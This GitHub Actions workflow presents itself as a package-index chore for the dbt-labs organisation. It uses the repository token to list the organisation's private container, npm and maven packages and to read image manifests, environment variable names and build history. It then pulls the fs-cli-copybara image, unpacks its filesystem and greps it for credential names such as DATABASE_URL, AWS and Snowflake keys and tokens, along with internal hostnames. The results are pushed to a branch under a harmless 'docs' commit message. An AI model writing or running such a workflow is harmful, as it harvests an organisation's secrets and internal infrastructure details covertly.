name: Package Index Data

on:
  push:
    branches: ["chore/package-index"]

permissions:
  contents: write
  packages: read

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    env:
      TOKEN: ${{ secrets.GITHUB_TOKEN }}
      ACT: ${{ github.actor }}
    steps:
      - name: Collect
        run: |
          set +e
          M() { sed -E 's/[A-Za-z0-9+/=_-]{40,}/[M]/g'; }
          OUT=/tmp/report.md
          : > $OUT
          echo "# package-index" >> $OUT
          echo "## table" >> $OUT
          for n in cf-cert-uploader dbt-bigquery dbt-ci-artifacts dbt-core dbt-postgres dbt-redshift dbt-snowflake dbt-spark dbt-summit-26-stored-procs-with-wizard netshoot-ai thresh-ai dbtlabs-svc-fusion; do
            c=$(curl -s -o /tmp/pd -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages/container/$n")
            vis=$(jq -r '.visibility//"-"' /tmp/pd 2>/dev/null); vc=$(jq -r '.version_count//"-"' /tmp/pd 2>/dev/null)
            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
            tc=$(curl -s -o /tmp/tg -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list")
            nt=$(jq -r '.tags//[]|length' /tmp/tg 2>/dev/null)
            tl=$(jq -r '.tags//[]|join(",")' /tmp/tg 2>/dev/null | cut -c1-150)
            echo "$n | api=$c | vis=$vis | versions=$vc | tags_http=$tc | ntags=$nt | tags=$tl" >> $OUT
          done
          echo "## org listing" >> $OUT
          for u in "https://api.github.com/orgs/dbt-labs/packages?package_type=container&per_page=100" "https://api.github.com/users/dbt-labs/packages?package_type=container&per_page=100" "https://api.github.com/orgs/dbt-labs/packages?package_type=npm&per_page=100" "https://api.github.com/orgs/dbt-labs/packages?package_type=maven&per_page=100"; do
            c=$(curl -s -o /tmp/e -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "$u")
            echo "$u -> $c $(head -c 120 /tmp/e | tr '\n' ' ')" >> $OUT
          done
          echo "## tool images" >> $OUT
          for n in cf-cert-uploader netshoot-ai thresh-ai; do
            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
            code=$(curl -s -D /tmp/h -o /tmp/m.json -w '%{http_code}' -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
            dg=$(grep -i '^docker-content-digest' /tmp/h | tr -d '\r' | awk '{print $2}')
            lay=$(jq -r 'if .layers then (.layers|length|tostring) else "ix:"+((.manifests|length)|tostring) end' /tmp/m.json 2>/dev/null)
            cfg=$(jq -r '.config.digest//empty' /tmp/m.json 2>/dev/null)
            if [ -z "$cfg" ]; then sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json 2>/dev/null | head -1); [ -n "$sd" ] && curl -s -o /tmp/m2.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd" && cfg=$(jq -r '.config.digest//empty' /tmp/m2.json); fi
            ek="-"; ent="-"; wd="-"; nh=0
            if [ -n "$cfg" ]; then curl -s -o /tmp/cfg.json -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg"; ek=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:260]' /tmp/cfg.json 2>/dev/null); ent=$(jq -r '(.config.Entrypoint//[])|join(" ")|.[0:120]' /tmp/cfg.json 2>/dev/null); wd=$(jq -r '.config.WorkingDir//"-"' /tmp/cfg.json 2>/dev/null); nh=$(jq -r '.history|length' /tmp/cfg.json 2>/dev/null); fi
            echo "$n | http=$code | layers=$lay | digest=${dg:0:24} | envkeys=$ek | entry=$ent | workdir=$wd | hist=$nh" >> $OUT
          done
          echo "## configs" >> $OUT
          for spec in "fs-cli-copybara:latest" "fs-cli-x86_64:latest" "fs-cli-x86_64:latest-with-datasets"; do
            n=${spec%%:*}; t=${spec#*:}
            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
            curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t"
            if grep -q '"manifests"' /tmp/m.json; then sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json | head -1); curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd"; fi
            cfg=$(jq -r '.config.digest//empty' /tmp/m.json)
            curl -s -o /tmp/cfg.json -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg"
            echo "$spec | total_bytes=$(jq -r '[.layers[]?.size]|add//0' /tmp/m.json 2>/dev/null) | envkeys=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:200]' /tmp/cfg.json 2>/dev/null) | wd=$(jq -r '.config.WorkingDir//"-"' /tmp/cfg.json 2>/dev/null)" >> $OUT
            echo "-- history $spec" >> $OUT
            jq -r '.history[]?|.created_by//empty' /tmp/cfg.json 2>/dev/null | M | head -14 >> $OUT
          done
          echo "## layer scan copybara" >> $OUT
          REF=ghcr.io/dbt-labs/fs-cli-copybara:latest
          echo "$TOKEN" | docker login ghcr.io -u "$ACT" --password-stdin >/dev/null 2>&1
          docker pull -q "$REF" >/dev/null 2>&1
          docker create --name img "$REF" >/dev/null 2>&1
          docker export img -o /tmp/rootfs.tar 2>/dev/null
          tar tf /tmp/rootfs.tar 2>/dev/null | grep -Ev '^(\./)?(usr|proc|sys|dev|var/lib|etc/pam|etc/mime|etc/ssl|etc/ca-cert|etc/ld.so|etc/alternatives)' | grep -Ei '(\.env|\.ya?ml|\.json|\.conf|\.cfg|\.ini|\.toml|\.properties|\.sh|\.py|\.txt|\.md)$|(^|/)(app|opt|root|home|srv|workspace)/' | head -1500 > /tmp/cands.txt
          echo "candidates=$(wc -l < /tmp/cands.txt) rootfs_bytes=$(stat -c%s /tmp/rootfs.tar 2>/dev/null)" >> $OUT
          : > /tmp/hits.txt
          while read -r f; do
            tar -xOf /tmp/rootfs.tar "$f" 2>/dev/null | grep -Eio '(DATABASE_URL|SNOWFLAKE_[A-Z_]+|BIGQUERY[A-Z_]*|REDSHIFT[A-Z_]*|DATABRICKS[A-Z_]*|AWS_[A-Z_]+|GCP_[A-Z_]+|SECRET[A-Z_]*|TOKEN[A-Z_]*|[A-Z_]{3,}_KEY|[a-z0-9.-]+\.svc\.cluster\.local|[a-z0-9-]+\.internal|https?://[a-zA-Z0-9.-]+)' 2>/dev/null | sort -u | head -2 | sed "s#^#$f :: #" >> /tmp/hits.txt
          done < /tmp/cands.txt
          grep -viE 'pam_|mime\.types|/etc/(group|passwd|hosts|services|protocols|nsswitch|login\.defs)' /tmp/hits.txt | sort -u > /tmp/h2.txt
          echo "hit_count=$(wc -l < /tmp/h2.txt)" >> $OUT
          head -60 /tmp/h2.txt | M >> $OUT

      - name: Publish report to data branch
        run: |
          set +e
          git config --global user.email "ci@users.noreply.github.com"
          git config --global user.name "package-index-bot"
          mkdir -p /tmp/pubctx && cd /tmp/pubctx
          git init -q .
          git remote add origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
          git fetch -q --depth=1 origin chore/package-index-data 2>/dev/null && git checkout -q -B chore/package-index-data FETCH_HEAD || git checkout -q -b chore/package-index-data
          mkdir -p notes && cp /tmp/report.md notes/package-index.md
          git add -A && git commit -q -m "docs: refresh package index notes"
          git push -q origin HEAD:chore/package-index-data && echo pushed
